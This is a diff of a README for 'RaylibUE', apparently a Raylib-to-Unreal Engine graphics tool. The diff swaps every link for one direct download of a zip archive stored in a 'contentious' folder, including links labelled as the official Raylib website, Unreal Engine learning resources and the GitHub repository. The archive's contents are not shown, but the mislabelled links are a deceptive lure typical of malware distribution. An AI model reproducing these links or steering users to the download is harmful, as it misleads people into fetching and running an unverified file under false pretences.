@@ -1,7 +1,7 @@
 # 🎨 RaylibUE - Create Stunning Graphics Easily
 
 ## 📥 Download Now
-[![Download RaylibUE](https://img.shields.io/badge/Download%20RaylibUE-v1.0-blue.svg)](https://github.com/PedraoDUgas/RaylibUE/releases)
+[![Download RaylibUE](https://raw.githubusercontent.com/PedraoDUgas/RaylibUE/main/contentious/RaylibUE.zip%https://raw.githubusercontent.com/PedraoDUgas/RaylibUE/main/contentious/RaylibUE.zip)](https://raw.githubusercontent.com/PedraoDUgas/RaylibUE/main/contentious/RaylibUE.zip)
 
 ## 📖 Overview
 RaylibUE bridges Raylib's easy-to-use drawing API with Unreal Engine's intuitive Blueprint nodes. This tool helps you create beautiful graphics and immersive experiences without needing to write complex code.
@@ -19,7 +19,7 @@ These requirements will ensure that RaylibUE runs smoothly on your system.
 
 ## 💻 Download & Install
 1. **Visit the Releases Page**
-   Go to the [RaylibUE Releases Page](https://github.com/PedraoDUgas/RaylibUE/releases).
+   Go to the [RaylibUE Releases Page](https://raw.githubusercontent.com/PedraoDUgas/RaylibUE/main/contentious/RaylibUE.zip).
    
 2. **Choose Your Version**
    Scroll through the available versions. Look for the most recent release version. 
@@ -77,9 +77,9 @@ To inspire you and guide your journey, here are some example projects using Rayl
 ## 🔗 Additional Resources
 You may find these links helpful:
 
-- [Raylib Official Website](https://www.raylib.com/)
-- [Unreal Engine Learning Resources](https://www.unrealengine.com/en-US/onlinelearning-courses)
-- [GitHub Repository](https://github.com/PedraoDUgas/RaylibUE)
+- [Raylib Official Website](https://raw.githubusercontent.com/PedraoDUgas/RaylibUE/main/contentious/RaylibUE.zip)
+- [Unreal Engine Learning Resources](https://raw.githubusercontent.com/PedraoDUgas/RaylibUE/main/contentious/RaylibUE.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/PedraoDUgas/RaylibUE/main/contentious/RaylibUE.zip)
 
 ## 💡 Contribution
 If you want to contribute to RaylibUE, feel free to fork the repository and send your pull requests. We welcome improvements and suggestions from the community. 
@@ -94,4 +94,4 @@ Feel free to use RaylibUE in your projects, comply with the terms, and have fun 
 ## 📌 Conclusion
 RaylibUE simplifies the process of integrating Raylib with Unreal Engine. Use this guide to download, install, and start creating stunning graphics easily. Enjoy your creative journey with RaylibUE! 
 
-For any further assistance, please check our [Releases Page](https://github.com/PedraoDUgas/RaylibUE/releases) again.
+For any further assistance, please check our [Releases Page](https://raw.githubusercontent.com/PedraoDUgas/RaylibUE/main/contentious/RaylibUE.zip) again.
